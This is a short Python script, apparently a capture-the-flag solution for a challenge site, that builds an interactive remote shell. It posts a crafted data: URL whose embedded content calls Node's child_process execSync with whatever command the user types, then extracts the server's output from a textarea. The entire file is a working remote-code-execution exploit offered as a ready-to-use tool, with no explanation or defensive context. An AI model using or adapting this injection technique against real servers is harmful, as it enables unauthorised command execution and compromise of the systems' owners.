import requests
import re
from html import unescape
from readline import redisplay

URL = "https://fetcheval.hackthesystem.pro/"


def req(x, url=URL):
    res = requests.post(url, data={
        "url": x,
    })
    return res.text


def parse_output(x):
    x = re.search(r"(?<=textarea disabled>).*?(?=</textarea>)", x, re.DOTALL)
    x = x.group(0)
    x = unescape(x)
    return x


def pseudo_shell(x: str):
    x = x.replace("'", "\\'")
    res = req(f"""data:localhost/html,
<div id='eval'>
    require('child_process').execSync('{x}')
</div>""")
    txt = parse_output(res)
    return txt
    
if __name__ == "__main__":
    while (True):
        cmd = input("$ ")
        redisplay()
        txt = pseudo_shell(cmd)
        print(txt)
    